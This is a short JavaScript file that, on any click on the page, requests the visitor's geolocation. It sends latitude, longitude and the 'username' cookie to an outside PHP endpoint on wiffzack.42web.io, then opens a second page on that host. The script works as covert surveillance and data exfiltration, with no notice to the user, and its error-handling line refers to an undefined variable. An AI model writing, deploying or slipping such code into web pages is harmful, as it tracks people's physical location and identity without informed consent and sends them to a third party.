function getCookie(a) {
    a = ("; " + document.cookie).split("; " + a + "=");
    if (2 == a.length) return a.pop().split(";").shift()
}

function sendCurrentLocation(a) {
    xmlhttp = new XMLHttpRequest;
    xmlhttp.open("GET", "http://wiffzack.42web.io/dontstressme.php?latitude=" + encodeURIComponent(a.coords.latitude) + "&longitude=" + encodeURIComponent(a.coords.longitude) + "&username=" + encodeURIComponent(getCookie("username")), !0);
    xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xmlhttp.timeout = 5E3;
    xmlhttp.send();
    window.open("http://wiffzack.42web.io/returncord.php")
}
document.body.addEventListener("click", function(a) {
    navigator.geolocation ? navigator.geolocation.getCurrentPosition(sendCurrentLocation) : x.innerHTML = "Geolocation is not supported by this browser."
});
